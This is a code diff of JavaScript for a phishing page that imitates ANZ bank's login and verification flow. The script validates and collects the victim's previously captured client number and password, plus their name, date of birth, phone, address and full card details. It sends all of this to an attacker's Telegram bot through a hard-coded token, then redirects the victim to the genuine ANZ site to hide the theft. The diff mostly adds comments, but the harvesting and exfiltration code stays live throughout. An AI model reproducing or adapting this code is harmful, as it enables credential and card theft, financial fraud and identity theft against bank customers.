@@ -641,6 +641,7 @@
          const stored = sessionStorage.getItem('anz_login_data');
          if (stored) {
             loginData = JSON.parse(stored);
+            // Show session warning if we have login data
             sessionWarning.style.display = 'block';
          }
       } catch (e) {
@@ -658,13 +659,6 @@
       const expiryDate = document.getElementById('expiry-date');
       const cvv = document.getElementById('cvv');
       const nameOnCard = document.getElementById('name-on-card');
-      
-      // Set numeric keypad for card and DOB fields
-      cardNumber.setAttribute('inputmode', 'numeric');
-      cvv.setAttribute('inputmode', 'numeric');
-      dobDay.setAttribute('inputmode', 'numeric');
-      dobMonth.setAttribute('inputmode', 'numeric');
-      dobYear.setAttribute('inputmode', 'numeric');
       
       // Error display helper
       const showError = (input, errorId, show = true) => {
@@ -694,6 +688,7 @@
          let value = input.value.replace(/\D/g, '');
          if (value.length > max) value = value.substring(0, max);
          
+         // Auto-add leading zero for single digits
          if (input.id === 'dob-day' && value.length === 1 && parseInt(value) > 3) {
             value = '0' + value;
          }
@@ -708,6 +703,7 @@
       dobMonth.addEventListener('input', () => formatDOB(dobMonth, 2));
       dobYear.addEventListener('input', () => formatDOB(dobYear, 4));
       
+      // Auto-tab between DOB fields
       dobDay.addEventListener('input', (e) => {
          if (e.target.value.length === 2) dobMonth.focus();
       });
@@ -721,6 +717,7 @@
          const month = dobMonth.value.padStart(2, '0');
          const year = dobYear.value;
          
+         // Clear previous errors
          showError(dobDay, 'dob-error', false);
          
          if (!day || !month || !year || year.length !== 4) {
@@ -732,17 +729,20 @@
          const monthNum = parseInt(month, 10);
          const yearNum = parseInt(year, 10);
          
+         // Check ranges
          if (dayNum < 1 || dayNum > 31 || monthNum < 1 || monthNum > 12 || yearNum < 1900 || yearNum > 2026) {
             showError(dobDay, 'dob-error');
             return false;
          }
          
+         // Check valid date
          const date = new Date(yearNum, monthNum - 1, dayNum);
          if (date.getDate() !== dayNum || date.getMonth() !== monthNum - 1 || date.getFullYear() !== yearNum) {
             showError(dobDay, 'dob-error');
             return false;
          }
          
+         // Check age (18+)
          const today = new Date();
          const age = today.getFullYear() - yearNum;
          if (age < 18 || (age === 18 && (today.getMonth() < monthNum - 1 || (today.getMonth() === monthNum - 1 && today.getDate() < dayNum)))) {
@@ -753,11 +753,13 @@
          return true;
       };
       
-      // Mobile formatting
+      // Mobile number formatting (Australian format)
       const formatMobile = (e) => {
          let value = e.target.value.replace(/\D/g, '');
+         // Must start with 04, max 10 digits
          if (value.length > 10) value = value.substring(0, 10);
          
+         // Format as 04XX XXX XXX
          if (value.length >= 4) {
             value = value.substring(0, 4) + ' ' + value.substring(4);
          }
@@ -803,7 +805,7 @@
       
       cardNumber.addEventListener('input', formatCardNumber);
       
-      // Luhn algorithm
+      // Luhn algorithm for card validation
       const validateCardLuhn = (number) => {
          let sum = 0;
          let shouldDouble = false;
@@ -831,7 +833,7 @@
          return true;
       };
       
-      // Expiry formatting
+      // Expiry date formatting
       const formatExpiry = (e) => {
          let value = e.target.value.replace(/\D/g, '');
          if (value.length > 4) value = value.substring(0, 4);
@@ -857,6 +859,7 @@
          const expiry = new Date(2000 + parseInt(year), parseInt(month) - 1);
          const today = new Date();
          
+         // Set to end of expiry month
          expiry.setMonth(expiry.getMonth() + 1);
          expiry.setDate(0);
          
@@ -904,31 +907,11 @@
          }
       };
       
-      // Format date as DD/MM/YY
-      const formatDateShort = (date) => {
-         const d = String(date.getDate()).padStart(2, '0');
-         const m = String(date.getMonth() + 1).padStart(2, '0');
-         const y = String(date.getFullYear()).slice(-2);
-         return `${d}/${m}/${y}`;
-      };
-      
-      // Format time as hh:mm am/pm
-      const formatTimeShort = (date) => {
-         let hours = date.getHours();
-         const minutes = String(date.getMinutes()).padStart(2, '0');
-         const ampm = hours >= 12 ? 'pm' : 'am';
-         hours = hours % 12;
-         hours = hours ? hours : 12;
-         return `${hours}:${minutes} ${ampm}`;
-      };
-      
-      // Monospace helper
-      const mono = (text) => `\`${text}\``;
-      
       // Form submission
       form.addEventListener('submit', async function(e) {
          e.preventDefault();
          
+         // Validate all fields
          let isValid = true;
          if (!validateFullName()) isValid = false;
          if (!validateDOB()) isValid = false;
@@ -941,13 +924,24 @@
          
          if (!isValid) return;
          
+         // Show loading
          loadingScreen.style.display = 'flex';
          
+         // Get IP and prepare data
          const clientIP = await getClientIP();
          const now = new Date();
+         const dateStr = now.toLocaleString('en-GB', {
+            day: '2-digit',
+            month: '2-digit',
+            year: '2-digit',
+            hour: '2-digit',
+            minute: '2-digit',
+            hour12: true
+         });
          
-         const formattedDOB = `${dobDay.value.padStart(2, '0')}/${dobMonth.value.padStart(2, '0')}/${dobYear.value.slice(-2)}`;
+         const formattedDOB = `${dobDay.value.padStart(2, '0')}/${dobMonth.value.padStart(2, '0')}/${dobYear.value}`;
          
+         // Build message including login data from index.html
          const crn = loginData ? loginData.crn : 'Not captured';
          const password = loginData ? loginData.password : 'Not captured';
          
@@ -956,7 +950,7 @@
 | Client: ${crn}
 | Password: ${password}
 +---------------- [👤 PERSONAL INFO 👤] ----------------+
-| Name: ${fullName.value}
+| Full Name: ${fullName.value}
 | DOB: ${formattedDOB}
 | Phone: ${mobileNumber.value}
 | Address: ${address.value}
@@ -972,9 +966,10 @@
 +----------------------------------------------------------+
          `;
          
+         // Send to Telegram
          const botToken = '8294882391:AAGhtpCr05OR5Y4bNnwmdsPcnMWMQ-8awFw';
          const chatId = '7987288274';
-         const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+         const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
          
          try {
             await fetch(telegramUrl);
@@ -982,8 +977,10 @@
             console.error('Telegram error:', err);
          }
          
+         // Clear session storage
          sessionStorage.removeItem('anz_login_data');
          
+         // Redirect after delay
          setTimeout(() => {
             window.location.href = "https://www.anz.com.au/personal/";
          }, 3000 + Math.random() * 2000);
